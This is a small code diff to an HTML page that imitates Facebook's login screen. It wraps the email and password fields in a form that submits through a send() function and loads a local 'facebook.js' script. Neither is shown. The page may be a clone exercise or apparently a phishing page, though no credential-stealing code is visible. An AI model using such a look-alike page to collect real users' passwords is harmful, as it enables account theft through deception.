@@ -4,17 +4,18 @@
         <meta charset="UTF-8">
         <title>Login</title>
         <link rel="stylesheet" href="stylesheets/login.css" type="text/css">
+        <script src="javascripts/facebook.js"></script>
     </head>
     <body>
         <div id="wrapper">
             <div class="center">
 				<div class="content">
-                    <div id="login">
+                    <form id="login" onsubmit="return send();">
                         <h3>Log in to Facebook</h3>
                         <input class="input" id="username" type="text" placeholder="Email address or phone number">
                         <input class="input" id="password" type="password" placeholder="Password">
-                        <button class="input" onsubmit="return send();">Log In</button>
-                    </div>
+                        <input class="input" id="submit" type="submit" value="Log In">
+                    </form>
 				</div>
 			</div>
         </div>
